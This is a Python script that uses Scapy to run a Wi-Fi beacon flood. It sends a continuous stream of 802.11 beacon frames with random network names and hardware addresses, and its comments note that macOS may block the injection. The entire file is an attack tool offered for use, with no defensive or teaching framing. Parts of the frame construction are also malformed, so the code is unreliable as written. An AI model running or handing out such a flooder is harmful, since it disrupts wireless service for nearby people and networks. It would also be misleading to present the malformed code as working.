#!/usr/bin/env python3
import sys
import os
import time
import random
import string

# Check for Scapy
try:
    from scapy.all import *
except ImportError:
    print("[!] CRITICAL: Scapy is not installed.")
    print("[!] You MUST run: brew install scapy")
    sys.exit(1)

def generate_random_essid(length=10):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def generate_random_bssid():
    return ':'.join(['{:02x}'.format(random.randint(0x00, 0xFF)) for _ in range(6)])

def create_beacon(essid, bssid):
    """
    Creates an 802.11 Beacon frame.
    Note: On macOS, sendp() will likely fail to inject this due to OS restrictions.
    """
    try:
        # Basic Beacon Frame Structure
        beacon = Dot11Beacon()
        cap = Dot11(capabilities=0x0411)  # Short Preamble, ESS
        timestamp = RandTime().fix()
        
        # SSID
        ssid = Dot11Elt(ID=0, info=essid.encode(), len=len(essid))
        
        # Supported Rates (Basic rates + some common ones)
        rates = Dot11Elt(ID=1, info=b'\x82\x84\x8b\x96\x24\x30\x48\x60', len=8)
        
        # DS Parameter Set (Channel 6 = 2437 MHz)
        ds = Dot11Elt(ID=3, info=bytes([6]), len=1)
        
        # Construct the packet
        # addr1: Destination (Broadcast ff:ff:ff:ff:ff:ff)
        # addr2: Source (BSSID)
        # addr3: BSSID
        pkt = Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=bssid, addr3=bssid) / beacon / cap / timestamp / ssid / rates / ds
        
        return pkt
    except Exception as e:
        print(f"[!] Error constructing packet: {e}")
        return None

def start_flood():
    print("[*] macOS Beacon Flood Simulation")
    print("[!] WARNING: macOS does not support true monitor mode injection.")
    print("[!] If this stops immediately or sends no packets, the OS blocked it.")
    print("[*] Press Ctrl+C to stop.")
    
    count = 0
    try:
        while True:
            essid = generate_random_essid()
            bssid = generate_random_bssid()
            
            pkt = create_beacon(essid, bssid)
            if pkt:
                try:
                    # Send the packet
                    sendp(pkt, verbose=False)
                    count += 1
                    if count % 10 == 0:
                        print(f"[*] Sent {count} beacons with ESSID: {essid}")
                except Exception as e:
                    print(f"[!] Packet send error: {e}")
                    print("[!] This confirms macOS is blocking raw injection.")
                    break
            
            time.sleep(0.05)
            
    except KeyboardInterrupt:
        print(f"\n[*] Stopped. Sent {count} packets.")
    except Exception as e:
        print(f"[!] Critical Error: {e}")

if __name__ == "__main__":
    if os.geteuid() != 0:
        print("[!] This script MUST be run with sudo")
        print("[!] Example: sudo python3 macos_beacon.py")
        sys.exit(1)
        
    start_flood()